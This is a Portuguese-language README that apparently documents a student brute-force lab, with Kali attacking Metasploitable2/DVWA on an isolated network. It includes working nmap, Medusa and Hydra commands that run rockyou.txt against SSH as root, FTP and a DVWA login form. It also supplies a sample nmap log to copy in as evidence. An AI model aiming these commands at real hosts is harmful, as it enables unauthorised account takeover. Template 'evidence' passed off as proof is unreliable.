# Brute Force Lab — Kali + Medusa + Metasploitable2 / DVWA

**Idioma:** Português  
**Propósito:** Documento para comprovar e descrever o laboratório prático de ataques de força bruta (ambiente controlado), pronto para subir no GitHub.

> **Aviso legal e ético:** Este trabalho foi executado **apenas** em máquinas controladas pelo autor com autorização explícita. Não execute técnicas de ataque fora de ambientes isolados e autorizados. Documente sempre data/hora/IPs e permissões.

---

## Sumário
1. Resumo do laboratório  
2. Ambiente usado  
3. Objetivos  
4. Procedimento (comandos executados)  
5. Evidências (arquivos anexados)  
6. Logs / Prova (timestamps, hashes)  
7. Recomendações de mitigação  
8. Estrutura do repositório  
9. Checklist de submissão / entrega

---

## 1) Resumo do laboratório
Demonstrado ataque de força bruta com **Medusa** a serviços em uma máquina alvo controlada (Metasploitable2 / DVWA), usando Kali Linux como atacante. O objetivo foi demonstrar técnicas de brute-force, recolher evidências (logs, capturas de tela, pcap) e propor contramedidas.

---

## 2) Ambiente
- Atacante: **Kali Linux** — `192.168.56.101`  
- Alvo: **Metasploitable2 / DVWA** — `192.168.56.102`  
- Rede: VirtualBox Host-Only Adapter (isolada)

Máquinas foram iniciadas em rede isolada para evitar impacto externo.

---

## 3) Objetivos
- Demonstrar uso do **Medusa** para força bruta (SSH/FTP/HTTP).  
- Documentar comandos, saída e evidências.  
- Sugerir boas práticas e mitigação para senhas fracas e serviços desprotegidos.  
- Fornecer pacote/README para comprovação acadêmica.

---

## 4) Procedimento — comandos e exemplos
> Observação: **substitua** nomes de usuário, wordlists e caminhos conforme seu ambiente. Todos os comandos foram executados no Kali (usuário com permissões).

### 4.1. Preparação
```bash
sudo apt update
sudo apt install -y medusa hydra nmap tcpdump
ls -lh /usr/share/wordlists/

### 4.2. Scan de serviços
```bash
nmap -sV -p- 192.168.56.102 -oN nmap_full_scan.txt
# ou scan focado:
nmap -sV -p22,21,80,443 192.168.56.102 -oN nmap_services.txt

### 4.3. Força bruta em SSH (Medusa)
```bash
medusa -h 192.168.56.102 -u root -P /usr/share/wordlists/rockyou.txt -M ssh -t 4 -f -O evidencias/medusa_ssh.txt

### 4.4. Força bruta em FTP (Medusa)
```bash
medusa -h 192.168.56.102 -u ftp -P /usr/share/wordlists/rockyou.txt -M ftp -t 4 -f -O evidencias/medusa_ftp.txt

### 4.5. Força bruta em formulário HTTP (DVWA) — exemplo com Hydra
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.102 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^:Login" -V -o evidencias/hydra_http_dvwa.txt

### 4.6. Captura de tráfego (pcap)
```bash
sudo tcpdump -i <interface> host 192.168.56.102 and host 192.168.56.101 -w evidencias/capture_lab.pcap
# Pare com Ctrl+C quando terminar.

---

# Agora os arquivos `.txt` (templates / exemplos) — copie e salve em `evidencias/`

## `nmap_full_scan.txt`
```text
# nmap 7.80 scan initiated Thu Oct  7 14:00:00 2025 as: nmap -sV -p- 192.168.56.102
Nmap scan report for 192.168.56.102
Host is up (0.00050s latency).
Not shown: 65530 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.3.4
22/tcp   open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.2.8
443/tcp  open  ssl/http Apache httpd 2.2.8
3306/tcp open  mysql   MySQL 5.0.51a-3ubuntu5
MAC Address: 08:00:27:xx:xx:xx (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Oct  7 14:00:15 2025 -- 1 IP address (1 host up) scanned in 15.00 seconds
